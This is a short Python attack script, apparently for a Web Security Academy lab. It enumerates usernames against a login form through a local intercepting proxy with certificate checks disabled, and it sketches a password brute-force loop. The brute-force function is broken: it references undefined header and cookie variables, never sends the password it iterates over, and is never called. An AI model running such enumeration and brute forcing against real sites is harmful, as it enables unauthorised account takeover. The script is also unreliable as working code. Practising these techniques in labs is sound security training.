import requests
import warnings
import re

warnings.filterwarnings('ignore')
proxyDict = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}
def bruteForce(user):
    with open('passwords.txt') as f:
        passwords = f.read().splitlines()
    for p in passwords:
        response = requests.request('GET', 'https://acb51fbc1f08cb79c04f69cf00ef007e.web-security-academy.net/my-account',
                                    proxies=proxyDict, verify=False, headers=header)
        if 'carlos' in str(response.content):
            print(f'[+] {response.status_code} {p} -> {encodedCookie}')       
        else:
            print(f'[-] {response.status_code} {p} -> {encodedCookie}')

def detectUser():
    with open('../usernames.txt') as f:
        users = f.read().splitlines()
    for u in users:
        formData = 'username='+u+'&password=123'
        response = requests.request('POST', 'https://acb51fbc1f08cb79c04f69cf00ef007e.web-security-academy.net/login',
                                    data=formData, proxies=proxyDict, verify=False).content.decode('utf-8')            
        analyticsId = re.search(r"id=(.*?)'", response).group(1)
        if '<!-- -->' in response:
            x = 1
        else:
            print (f'{analyticsId} [NOT-FOUND] {u}')
        #analyticsResult = requests.request('GET', f'https://ace01f701fe1718ac0bf229000b6008f.web-security-academy.net/analytics?id={analyticsId}', proxies=proxyDict, verify=False).content.decode('utf-8')
        #print (f'#{u} ID {analyticsId} Result [{analyticsResult}]')

detectUser()